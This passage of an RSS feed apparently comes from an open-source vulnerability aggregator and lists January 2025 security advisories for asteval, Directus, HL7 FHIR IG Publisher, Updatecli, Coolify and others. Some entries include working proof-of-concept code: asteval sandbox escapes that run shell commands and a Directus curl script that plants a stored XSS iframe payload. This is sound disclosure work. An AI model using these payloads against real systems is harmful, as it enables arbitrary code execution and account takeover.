                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=391689728'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=391689728</a></li></ul><br>
                            <b>Details:</b> <b>Heap-buffer-overflow in extract_candidate</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=391689728

```
Crash type: Heap-buffer-overflow READ 8
Crash state:
extract_candidate
parse_sdp_session
parse_mixed_content
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-6729-95v3-pjc2: 4.2 | <b>HL7 FHIR IG Publisher potentially exposes GitHub repo user and credential information</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-6729-95v3-pjc2</link>
                    <pubDate>2025-01-24T20:40:15Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-6729-95v3-pjc2'>https://osv.dev/vulnerability/GHSA-6729-95v3-pjc2</a><br>
                            <b>Published:</b> 2025-01-24T20:40:15Z<br>
                            <b>Severity:</b> 4.2<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/HL7/fhir-ig-publisher/security/advisories/GHSA-6729-95v3-pjc2'>https://github.com/HL7/fhir-ig-publisher/security/advisories/GHSA-6729-95v3-pjc2</a></li><li>- <a target='_blank' href='https://github.com/HL7/fhir-ig-publisher/commit/d968694b7dd041640efab5414d7077d5028569f7'>https://github.com/HL7/fhir-ig-publisher/commit/d968694b7dd041640efab5414d7077d5028569f7</a></li><li>- <a target='_blank' href='https://github.com/HL7/fhir-ig-publisher'>https://github.com/HL7/fhir-ig-publisher</a></li><li>- <a target='_blank' href='https://github.com/HL7/fhir-ig-publisher/releases/tag/1.8.9'>https://github.com/HL7/fhir-ig-publisher/releases/tag/1.8.9</a></li></ul><br>
                            <b>Details:</b> <b>HL7 FHIR IG Publisher potentially exposes GitHub repo user and credential information</b><br>### Impact
In CI contexts, the IG Publisher CLI uses git commands to determine the URL of the originating repo. If the repo was cloned, or otherwise set to use a repo that uses a username and credential based URL, the entire URL will be included in the built Implementation Guide, exposing username and credential. This does not impact users that clone public repos without credentials, such as those using the auto-ig-build continuous integration infrastructure.

### Patches
This problem has been patched in release [1.8.9](https:&#x2F;&#x2F;github.com&#x2F;HL7&#x2F;fhir-ig-publisher&#x2F;releases&#x2F;tag&#x2F;1.8.9)

### Workarounds
Users should update to 1.8.9 or the latest release 

OR 

Users should ensure the IG repo they are publishing does not have username or credentials included in the `origin` URL. Running the command `git remote origin url` should return a URL that contains no username, password, or token.

OR

Users should run the IG Publisher CLI with the `-repo` parameter and specify a URL that contains no username, password, or token.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-3wwr-3g9f-9gc7: 8.4 | <b>ASTEVAL Allows Maliciously Crafted Format Strings to Lead to Sandbox Escape</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-3wwr-3g9f-9gc7</link>
                    <pubDate>2025-01-24T18:45:30Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-3wwr-3g9f-9gc7'>https://osv.dev/vulnerability/GHSA-3wwr-3g9f-9gc7</a><br>
                            <b>Published:</b> 2025-01-24T18:45:30Z<br>
                            <b>Severity:</b> 8.4<br>
                            <b>Langs:</b> py<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/lmfit/asteval/security/advisories/GHSA-3wwr-3g9f-9gc7'>https://github.com/lmfit/asteval/security/advisories/GHSA-3wwr-3g9f-9gc7</a></li><li>- <a target='_blank' href='https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2'>https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2</a></li><li>- <a target='_blank' href='https://github.com/lmfit/asteval'>https://github.com/lmfit/asteval</a></li><li>- <a target='_blank' href='https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507'>https://github.com/lmfit/asteval/blob/cfb57f0beebe0dc0520a1fbabc35e66060c7ea71/asteval/asteval.py#L507</a></li><li>- <a target='_blank' href='https://lucumr.pocoo.org/2016/12/29/careful-with-str-format'>https://lucumr.pocoo.org/2016/12/29/careful-with-str-format</a></li></ul><br>
                            <b>Details:</b> <b>ASTEVAL Allows Maliciously Crafted Format Strings to Lead to Sandbox Escape</b><br>### Summary
If an attacker can control the input to the `asteval` library, they can bypass asteval&#x27;s restrictions and execute arbitrary Python code in the context of the application using the library.

### Details
The vulnerability is rooted in how `asteval` performs handling of `FormattedValue` AST nodes. In particular, the [`on_formattedvalue`](https:&#x2F;&#x2F;github.com&#x2F;lmfit&#x2F;asteval&#x2F;blob&#x2F;cfb57f0beebe0dc0520a1fbabc35e66060c7ea71&#x2F;asteval&#x2F;asteval.py#L507) value uses the [dangerous format method of the str class](https:&#x2F;&#x2F;lucumr.pocoo.org&#x2F;2016&#x2F;12&#x2F;29&#x2F;careful-with-str-format&#x2F;), as shown in the vulnerable code snippet below:

```py
    def on_formattedvalue(self, node): # (&#x27;value&#x27;, &#x27;conversion&#x27;, &#x27;format_spec&#x27;)
        &quot;formatting used in f-strings&quot;
        val = self.run(node.value)
        fstring_converters = {115: str, 114: repr, 97: ascii}
        if node.conversion in fstring_converters:
            val = fstring_converters[node.conversion](val)
        fmt = &#x27;{__fstring__}&#x27;
        if node.format_spec is not None:
            fmt = f&#x27;{{__fstring__:{self.run(node.format_spec)}}}&#x27;
        return fmt.format(__fstring__=val)
```

The code above allows an attacker to manipulate the value of the string used in the dangerous call `fmt.format(__fstring__=val)`. This vulnerability can be exploited to access protected attributes by intentionally triggering an `AttributeError` exception. The attacker can then catch the exception and use its `obj` attribute to gain arbitrary access to sensitive or protected object properties.

### PoC
The following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the `whoami` command on the host machine:

```py
from asteval import Interpreter
aeval = Interpreter()
code = &quot;&quot;&quot;
# def lender():
#     ga
    
def pwn():
    try:
        f&quot;{dict.mro()[1]:&#x27;\\x7B__fstring__.__getattribute__.s\\x7D&#x27;}&quot;
    except Exception as ga:
        ga = ga.obj
        sub = ga(dict.mro()[1],&quot;__subclasses__&quot;)()
        importer = None
        for i in sub:
            if &quot;BuiltinImporter&quot; in str(i):
                importer = i.load_module
                break
        os = importer(&quot;os&quot;)
        os.system(&quot;whoami&quot;)

# pre commit cfb57f0beebe0dc0520a1fbabc35e66060c7ea71, it was required to modify the AST to make this work using the code below
# pwn.body[0].handlers[0].name = lender.body[0].value # need to make it an identifier so node_assign works
        
pwn()
&quot;&quot;&quot;
aeval(code)

```
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-v34r-vj4r-38j6: 7.1 | <b>Updatecli exposes Maven credentials in console output</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-v34r-vj4r-38j6</link>
                    <pubDate>2025-01-24T18:45:20Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-v34r-vj4r-38j6'>https://osv.dev/vulnerability/GHSA-v34r-vj4r-38j6</a><br>
                            <b>Published:</b> 2025-01-24T18:45:20Z<br>
                            <b>Severity:</b> 7.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/updatecli/updatecli/security/advisories/GHSA-v34r-vj4r-38j6'>https://github.com/updatecli/updatecli/security/advisories/GHSA-v34r-vj4r-38j6</a></li><li>- <a target='_blank' href='https://github.com/updatecli/updatecli/commit/344b28091ffeca5ed32e8d0f9eda542842fcd3fa'>https://github.com/updatecli/updatecli/commit/344b28091ffeca5ed32e8d0f9eda542842fcd3fa</a></li><li>- <a target='_blank' href='https://github.com/updatecli/updatecli'>https://github.com/updatecli/updatecli</a></li><li>- <a target='_blank' href='https://www.updatecli.io/docs/plugins/resource/maven'>https://www.updatecli.io/docs/plugins/resource/maven</a></li></ul><br>
                            <b>Details:</b> <b>Updatecli exposes Maven credentials in console output</b><br>### Summary

Private maven repository credentials leaked in application logs in case of unsuccessful retrieval operation.

### Details

During the execution of an updatecli pipeline which contains a `maven` source configured with basic auth credentials, the credentials are being leaked in the application execution logs in case of failure.

Credentials are properly sanitized when the operation is successful but not when for whatever reason there is a failure in the maven repository .e.g. wrong coordinates provided, not existing artifact or version.

### PoC

The [documentation](https:&#x2F;&#x2F;www.updatecli.io&#x2F;docs&#x2F;plugins&#x2F;resource&#x2F;maven&#x2F;) currently state to provide user credentials as basic auth inside the `repository` field. e.g.

```
sources:
  default:
    kind: maven
    spec:
      repository: &quot;{{ requiredEnv &quot;MAVEN_USERNAME&quot; }}:{{ requiredEnv &quot;MAVEN_PASS&quot; }}@repo.example.org&#x2F;releases&quot;
      groupid: &quot;org.example.company&quot;
      artifactid: &quot;my-artifact&quot;
      versionFilter:
        kind: regex
        pattern: &quot;^23(\.[0-9]+){1,2}$&quot;
```

Logs are sanitized properly in case of a successful operation:

```
source: source#default
-----------------------------------------------------------
Searching for version matching pattern &quot;^23(\\.[0-9]+){1,2}$&quot;
✔ Latest version is 23.4.0 on the Maven repository at https:&#x2F;&#x2F;repo.example.org&#x2F;releases&#x2F;org&#x2F;example&#x2F;company&#x2F;my-artifact&#x2F;maven-metadata.xml
```

but leaks credentials in case the GAV coordinates are wrong (misspelled package name or missing):

```
source: source#default
-----------------------------------------------------------
ERROR: ✗ getting latest version: URL &quot;https:&#x2F;&#x2F;REDACTED:REDACTED@repo.example.org&#x2F;releases&#x2F;org&#x2F;example&#x2F;company&#x2F;wrong-artifact&#x2F;maven-metadata.xml&quot; not found or in error
```

### Impact

User credentials&#x2F;token used to authenticate against a private maven repository can be leaked in clear-text in console or CI logs.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-8c3x-hq82-gjcm: 8.6 | <b>XXE vulnerability in XSLT parsing in `org.hl7.fhir.publisher`</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-8c3x-hq82-gjcm</link>
                    <pubDate>2025-01-24T18:33:29Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-8c3x-hq82-gjcm'>https://osv.dev/vulnerability/GHSA-8c3x-hq82-gjcm</a><br>
                            <b>Published:</b> 2025-01-24T18:33:29Z<br>
                            <b>Severity:</b> 8.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/HL7/fhir-ig-publisher/security/advisories/GHSA-59rq-22fm-x8q5'>https://github.com/HL7/fhir-ig-publisher/security/advisories/GHSA-59rq-22fm-x8q5</a></li><li>- <a target='_blank' href='https://github.com/HL7/fhir-ig-publisher/security/advisories/GHSA-8c3x-hq82-gjcm'>https://github.com/HL7/fhir-ig-publisher/security/advisories/GHSA-8c3x-hq82-gjcm</a></li><li>- <a target='_blank' href='https://github.com/HL7/fhir-ig-publisher'>https://github.com/HL7/fhir-ig-publisher</a></li><li>- <a target='_blank' href='https://github.com/HL7/fhir-ig-publisher/compare/1.7.3...1.7.4'>https://github.com/HL7/fhir-ig-publisher/compare/1.7.3...1.7.4</a></li></ul><br>
                            <b>Details:</b> <b>XXE vulnerability in XSLT parsing in `org.hl7.fhir.publisher`</b><br>### Impact
XSLT transforms performed by various components are vulnerable to XML external entity injections. A processed XML file with a malicious DTD tag ( ]&amp;gt; could produce XML containing data from the host system. This impacts use cases where org.hl7.fhir.publisher is being used to within a host where external clients can submit XML.

A previous release provided an incomplete solution revealed by new testing. 

### Patches
This issue has been patched as of version 1.7.4

### Workarounds
None

### References
[Previous Advisory for Incomplete solution](https:&#x2F;&#x2F;github.com&#x2F;HL7&#x2F;fhir-ig-publisher&#x2F;security&#x2F;advisories&#x2F;GHSA-59rq-22fm-x8q5)
[MITRE CWE](https:&#x2F;&#x2F;cwe.mitre.org&#x2F;data&#x2F;definitions&#x2F;611.html)
[OWASP XML External Entity Prevention Cheat Sheet](https:&#x2F;&#x2F;cheatsheetseries.owasp.org&#x2F;cheatsheets&#x2F;XML_External_Entity_Prevention_Cheat_Sheet.html#transformerfactory)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-22605: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-22605</link>
                    <pubDate>2025-01-24T15:15:12Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-22605'>https://osv.dev/vulnerability/CVE-2025-22605</a><br>
                            <b>Published:</b> 2025-01-24T15:15:12Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/coollabsio/coolify/blob/40a239ddda3fc919f57a052d7b52b8e1a6696b81/bootstrap/helpers/remoteProcess.php#L70'>https://github.com/coollabsio/coolify/blob/40a239ddda3fc919f57a052d7b52b8e1a6696b81/bootstrap/helpers/remoteProcess.php#L70</a></li><li>- <a target='_blank' href='https://github.com/coollabsio/coolify/pull/1524'>https://github.com/coollabsio/coolify/pull/1524</a></li><li>- <a target='_blank' href='https://github.com/coollabsio/coolify/pull/1625'>https://github.com/coollabsio/coolify/pull/1625</a></li></ul><br>
                            <b>Details:</b> <b></b><br>Coolify is an open-source and self-hostable tool for managing servers, applications, and databases. Starting in version 4.0.0-beta.18 and prior to 4.0.0-beta.253, a vulnerability in the execution of commands on remote servers allows an authenticated user to execute arbitrary code on the local Coolify container, gaining access to data and private keys or tokens of other users&#x2F;teams. The ability to inject malicious commands into the Coolify container gives authenticated attackers the ability to fully retrieve and control the data and availability of the software. Centrally hosted Coolify instances (open registration and&#x2F;or multiple teams with potentially untrustworthy users) are especially at risk, as sensitive data of all users and connected servers can be leaked by any user. Additionally, attackers are able to modify the running software, potentially deploying malicious images to remote nodes or generally changing its behavior. Version 4.0.0-beta.253 patches this issue.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-0314: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-0314</link>
                    <pubDate>2025-01-24T03:15:07Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-0314'>https://osv.dev/vulnerability/CVE-2025-0314</a><br>
                            <b>Published:</b> 2025-01-24T03:15:07Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://gitlab.com/gitlab-org/gitlab/-/issues/512118'>https://gitlab.com/gitlab-org/gitlab/-/issues/512118</a></li><li>- <a target='_blank' href='https://hackerone.com/reports/2922313'>https://hackerone.com/reports/2922313</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue has been discovered in GitLab CE&#x2F;EE affecting all versions from 17.2 before 17.6.4, 17.7 before 17.7.3, and 17.8 before 17.8.1. Improper rendering of certain file types lead to cross-site scripting.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-w5hq-hm5m-4548: 6.1 | <b>Cross Site Scripting vulnerability in store2</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-w5hq-hm5m-4548</link>
                    <pubDate>2025-01-24T00:31:47Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-w5hq-hm5m-4548'>https://osv.dev/vulnerability/GHSA-w5hq-hm5m-4548</a><br>
                            <b>Published:</b> 2025-01-24T00:31:47Z<br>
                            <b>Severity:</b> 6.1<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/nbubna/store/issues/127'>https://github.com/nbubna/store/issues/127</a></li><li>- <a target='_blank' href='https://github.com/nbubna/store/pull/128'>https://github.com/nbubna/store/pull/128</a></li><li>- <a target='_blank' href='https://github.com/nbubna/store'>https://github.com/nbubna/store</a></li></ul><br>
                            <b>Details:</b> <b>Cross Site Scripting vulnerability in store2</b><br>Cross Site Scripting vulnerability in nbubna store v.2.14.2 and before allows a remote attacker to execute arbitrary code via the store.deep.js component
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-9qrm-48qf-r2rw: 3.4 | <b>Directus has a DOM-Based cross-site scripting (XSS) via layout_options</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-9qrm-48qf-r2rw</link>
                    <pubDate>2025-01-23T22:36:50Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-9qrm-48qf-r2rw'>https://osv.dev/vulnerability/GHSA-9qrm-48qf-r2rw</a><br>
                            <b>Published:</b> 2025-01-23T22:36:50Z<br>
                            <b>Severity:</b> 3.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/directus/directus/security/advisories/GHSA-9qrm-48qf-r2rw'>https://github.com/directus/directus/security/advisories/GHSA-9qrm-48qf-r2rw</a></li><li>- <a target='_blank' href='https://github.com/directus/directus'>https://github.com/directus/directus</a></li></ul><br>
                            <b>Details:</b> <b>Directus has a DOM-Based cross-site scripting (XSS) via layout_options</b><br>### Impact
Directus allows an authenticated attacker to save cross site scripting code to the database. This is possible because the application injects an attacker-controlled parameter that will be stored in the server and used by the client into an unsanitized DOM element. When chained with [CVE-2024-6534](https:&#x2F;&#x2F;github.com&#x2F;directus&#x2F;directus&#x2F;security&#x2F;advisories&#x2F;GHSA-3fff-gqw3-vj86), it could result in account takeover.

### PoC
To exploit this vulnerability, we need to do the following steps using a non-administrative, default role attacker account.

1. Upload the following JavaScript file.

Using the upload functionality at `POST &#x2F;files`. This PoC will show an alert message.

```js
export TARGET_HOST=&quot;http:&#x2F;&#x2F;localhost:8055&quot;
export ATTACKER_EMAIL=&quot;malicious@malicious.com&quot;
export ATTACKER_PASSWORD=&quot;123456&quot;
root_dir=$(dirname $0)
mkdir &quot;${root_dir}&#x2F;static&quot;

curl -s -k -o &#x2F;dev&#x2F;null -w &quot;%{http_code}&quot; -X &#x27;POST&#x27; &quot;${TARGET_HOST}&#x2F;auth&#x2F;login&quot; \
    -c &quot;${root_dir}&#x2F;static&#x2F;attacker_directus_session_token&quot; \
    -H &#x27;Content-Type: application&#x2F;json&#x27; \
    -d &quot;{\&quot;email\&quot;:\&quot;${ATTACKER_EMAIL}\&quot;,\&quot;password\&quot;:\&quot;${ATTACKER_PASSWORD}\&quot;,\&quot;mode\&quot;:\&quot;session\&quot;}&quot;

id_url_file=$(echo &quot;alert(&#x27;Successful DOM-based XSS&#x27;)&quot; |
  curl -s -k -X &#x27;POST&#x27; &quot;${TARGET_HOST}&#x2F;files&quot; \
    -b &quot;${root_dir}&#x2F;static&#x2F;attacker_directus_session_token&quot; \
    -F &quot;file=@-;type=application&#x2F;x-javascript;filename=poc.js&quot; | jq -r &quot;.data.id&quot;)
```

2. Create a preset for a collection and store the preset ID.

Or use a preset already created from GET &#x2F;presets. The following example uses the direct_users preset.

```
attacker_user_id=$(curl -s -k &quot;${TARGET_HOST}&#x2F;users&#x2F;me&quot; \ -b &quot;${root_dir}&#x2F;static&#x2F;attacker_directus_session_token&quot; | jq -r &quot;.data.id&quot;) curl -i -s -k -X &#x27;POST&#x27; &quot;${TARGET_HOST}&#x2F;presets&quot; \ -H &#x27;Content-Type: application&#x2F;json&#x27; \ -b &quot;${root_dir}&#x2F;static&#x2F;attacker_directus_session_token&quot; \ --data-binary &quot;{\&quot;layout\&quot;:\&quot;cards\&quot;,\&quot;bookmark\&quot;:null,\&quot;role\&quot;:null,\&quot;user\&quot;:\&quot;${attacker_user_id}\&quot;,\&quot;search\&quot;:null,\&quot;filter\&quot;:null,\&quot;layout_query\&quot;:{\&quot;cards\&quot;:{\&quot;sort\&quot;:[\&quot;email\&quot;]}},\&quot;layout_options\&quot;:{\&quot;cards\&quot;:{\&quot;icon\&quot;:\&quot;account_circle\&quot;,\&quot;title\&quot;:\&quot;&amp;lt;iframe srcdoc=\\\&quot;&amp;lt;script src=&#x27;http:&#x2F;&#x2F;localhost:8055&#x2F;assets&#x2F;${id_url_file}&#x27;&amp;gt; &amp;lt;&#x2F;script&amp;gt;\\\&quot;&amp;gt;\&quot;,\&quot;subtitle\&quot;:\&quot;{{ email }}\&quot;,\&quot;size\&quot;:4}},\&quot;refresh_interval\&quot;:null,\&quot;icon\&quot;:\&quot;bookmark\&quot;,\&quot;color\&quot;:null,\&quot;collection\&quot;:\&quot;directus_users\&quot;}&quot;
```

When the user visits the view that uses the directus_users preset, the JavaScript file will be executed.

Notes:

Need to use an iframe to execute the malicious JavaScript file to bypass the CSP policies. The payload structure is `&amp;lt;iframe srcdoc=\&quot;&amp;lt;script src=&#x27;URL_MALICIOUS_FILE&#x27;&amp;gt; &amp;lt;&#x2F;script&amp;gt;\&quot;&amp;gt;`.

We can target any collection that uses the vulnerable template structure that renders the layout option section.

In this PoC, the target is the same user who sends the payload, but if the attacking user has permission to modify or create presets for other users or even if he does not have permissions but can chain with CVE-2024-6534, he can achieve an account takeover.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-pmf4-v838-29hg: 5.0 | <b>Directus allows privilege escalation using Share feature</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-pmf4-v838-29hg</link>
                    <pubDate>2025-01-23T22:35:52Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-pmf4-v838-29hg'>https://osv.dev/vulnerability/GHSA-pmf4-v838-29hg</a><br>
                            <b>Published:</b> 2025-01-23T22:35:52Z<br>
                            <b>Severity:</b> 5.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/directus/directus/security/advisories/GHSA-pmf4-v838-29hg'>https://github.com/directus/directus/security/advisories/GHSA-pmf4-v838-29hg</a></li><li>- <a target='_blank' href='https://github.com/directus/directus/pull/23716'>https://github.com/directus/directus/pull/23716</a></li><li>- <a target='_blank' href='https://github.com/directus/directus/commit/e288a43a79613dada905da683f4919c6965ac804'>https://github.com/directus/directus/commit/e288a43a79613dada905da683f4919c6965ac804</a></li><li>- <a target='_blank' href='https://github.com/directus/directus'>https://github.com/directus/directus</a></li><li>- <a target='_blank' href='https://github.com/directus/directus/releases/tag/v11.2.0'>https://github.com/directus/directus/releases/tag/v11.2.0</a></li><li>- <a target='_blank' href='https://www.youtube.com/watch?v=DbV4IxbWzN4'>https://www.youtube.com/watch?v=DbV4IxbWzN4</a></li></ul><br>
                            <b>Details:</b> <b>Directus allows privilege escalation using Share feature</b><br>### Summary
When sharing an item, user can specify an arbitrary role. It allows user to use a higher-privileged role to see fields that otherwise the user should not be able to see.

### Details
Specifying `role` on share should be available only for admins. The current flow has a security flaw.

Each other role should allow to share only in the context of the same role. As there is no role hierarchy in Directus, it is impossible to tell which role is _higher_ or _lower_, so only admins should be able to specify the role for share.

Optionally, instead of specifying a role, shareer* should be able to specify which fields (limited to fields shareer sees) are available on shared item. Similarily to import.

*_shareer_ - a person that creates a share link to item

### PoC
1. Create a collection with a secret field. 
2. Create role A that sees the secret field
3. Create role B that does not see the secret field, but can use share feature.
4. Create item with secret field filled. 
5. Use account with role B to share the object as role A and gain unauthorized access to secret value.

Here&#x27;s video example: https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=DbV4IxbWzN4
I had to upload it to YouTube, because GitHub allows only 10MB videos.

### Impact
Impacted are instances that use the share feature and have specific roles hierarchy and fields that are not visible for certain roles.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-vp47-9734-prjw: 8.4 | <b>ASTEVAL Allows Malicious Tampering of Exposed AST Nodes Leads to Sandbox Escape</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-vp47-9734-prjw</link>
                    <pubDate>2025-01-23T22:33:48Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-vp47-9734-prjw'>https://osv.dev/vulnerability/GHSA-vp47-9734-prjw</a><br>
                            <b>Published:</b> 2025-01-23T22:33:48Z<br>
                            <b>Severity:</b> 8.4<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/lmfit/asteval/security/advisories/GHSA-vp47-9734-prjw'>https://github.com/lmfit/asteval/security/advisories/GHSA-vp47-9734-prjw</a></li><li>- <a target='_blank' href='https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2'>https://github.com/lmfit/asteval/commit/45bb47533f7abb5479618ae7f6a809215700dcb2</a></li><li>- <a target='_blank' href='https://github.com/lmfit/asteval'>https://github.com/lmfit/asteval</a></li></ul><br>
                            <b>Details:</b> <b>ASTEVAL Allows Malicious Tampering of Exposed AST Nodes Leads to Sandbox Escape</b><br>### Summary
If an attacker can control the input to the asteval library, they can bypass its safety restrictions and execute arbitrary Python code within the application&#x27;s context.

### Details
The vulnerability is rooted in how `asteval` performs attribute access verification. In particular, the [`on_attribute`](https:&#x2F;&#x2F;github.com&#x2F;lmfit&#x2F;asteval&#x2F;blob&#x2F;8d7326df8015cf6a57506b1c2c167a1c3763e090&#x2F;asteval&#x2F;asteval.py#L565) node handler prevents access to attributes that are either present in the `UNSAFE_ATTRS` list or are formed by names starting and ending with `__`, as shown in the code snippet below:

```py
    def on_attribute(self, node):    # (&#x27;value&#x27;, &#x27;attr&#x27;, &#x27;ctx&#x27;)
        &quot;&quot;&quot;Extract attribute.&quot;&quot;&quot;

        ctx = node.ctx.__class__
        if ctx == ast.Store:
            msg = &quot;attribute for storage: shouldn&#x27;t be here!&quot;
            self.raise_exception(node, exc=RuntimeError, msg=msg)

        sym = self.run(node.value)
        if ctx == ast.Del:
            return delattr(sym, node.attr)
        #
        unsafe = (node.attr in UNSAFE_ATTRS or
                 (node.attr.startswith(&#x27;__&#x27;) and node.attr.endswith(&#x27;__&#x27;)))
        if not unsafe:
            for dtype, attrlist in UNSAFE_ATTRS_DTYPES.items():
                unsafe = isinstance(sym, dtype) and node.attr in attrlist
                if unsafe:
                    break
        if unsafe:
            msg = f&quot;no safe attribute &#x27;{node.attr}&#x27; for {repr(sym)}&quot;
            self.raise_exception(node, exc=AttributeError, msg=msg)
        else:
            try:
                return getattr(sym, node.attr)
            except AttributeError:
                pass
```

While this check is intended to block access to sensitive Python dunder methods (such as `__getattribute__`), the flaw arises because instances of the `Procedure` class expose their AST (stored in the `body` attribute) without proper protection:

```py
class Procedure:
    &quot;&quot;&quot;Procedure: user-defined function for asteval.

    This stores the parsed ast nodes as from the &#x27;functiondef&#x27; ast node
    for later evaluation.

    &quot;&quot;&quot;

    def __init__(self, name, interp, doc=None, lineno=0,
                 body=None, args=None, kwargs=None,
                 vararg=None, varkws=None):
        &quot;&quot;&quot;TODO: docstring in public method.&quot;&quot;&quot;
        self.__ininit__ = True
        self.name = name
        self.__name__ = self.name
        self.__asteval__ = interp
        self.raise_exc = self.__asteval__.raise_exception
        self.__doc__ = doc
        self.body = body
        self.argnames = args
        self.kwargs = kwargs
        self.vararg = vararg
        self.varkws = varkws
        self.lineno = lineno
        self.__ininit__ = False
```

Since the `body` attribute is not protected by a naming convention that would restrict its modification, an attacker can modify the AST of a `Procedure` during runtime to leverage unintended behaviour.

The exploit works as follows:

1. **The Time of Check, Time of Use (TOCTOU) Gadget:**

   In the [code](https:&#x2F;&#x2F;github.com&#x2F;lmfit&#x2F;asteval&#x2F;blob&#x2F;8d7326df8015cf6a57506b1c2c167a1c3763e090&#x2F;asteval&#x2F;asteval.py#L577) below, a variable named `unsafe` is set based on whether `node.attr` is considered unsafe:

   ```python
   unsafe = (node.attr in UNSAFE_ATTRS or
             (node.attr.startswith(&#x27;__&#x27;) and node.attr.endswith(&#x27;__&#x27;)))
   ```

2. **Exploiting the TOCTOU Gadget:**

   An attacker can abuse this gadget by hooking any `Attribute` AST node that is not in the `UNSAFE_ATTRS` list. The attacker modifies the `node.attr.startswith` function so that it points to a custom procedure. This custom procedure performs the following steps:
   
   - It replaces the value of `node.attr` with the string `&quot;__getattribute__&quot;` and returns `False`.
   - Thus, when `node.attr.startswith(&#x27;__&#x27;)` is evaluated, it returns `False`, which causes the condition to short-circuit and sets `unsafe` to `False`.
   - However, by that time, `node.attr` has been changed to `&quot;__getattribute__&quot;`, which will be used in the subsequent `getattr(sym, node.attr)` call. An attacker can then use the obtained reference to `sym.__getattr__`to retrieve malicious attributes without needing to pass the `on_attribute` checks.

### PoC
The following proof-of-concept (PoC) demonstrates how this vulnerability can be exploited to execute the `whoami` command on the host machine:

```py
from asteval import Interpreter
aeval = Interpreter()
code = &quot;&quot;&quot;
ga_str = &quot;__getattribute__&quot;
def lender():
    a
    b
def pwn():
    ga = lender.dontcare
    init = ga(&quot;__init__&quot;)
    ga = init.dontcare
    globals = ga(&quot;__globals__&quot;)
    builtins = globals[&quot;__builtins__&quot;]
    importer = builtins[&quot;__import__&quot;]
    importer(&quot;os&quot;).system(&quot;whoami&quot;)

def startswith1(str):
    # Replace the attr on the targeted AST node with &quot;__getattribute__&quot;
    pwn.body[0].value.attr = ga_str
    return False    

def startswith2(str):
    pwn.body[2].value.attr = ga_str
    return False    

n1 = lender.body[0]
n1.startswith = startswith1
pwn.body[0].value.attr = n1

n2 = lender.body[1]
n2.startswith = startswith2
pwn.body[2].value.attr = n2

pwn()
&quot;&quot;&quot;
aeval(code)
```
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-57556: 6.1 | <b></b></title>
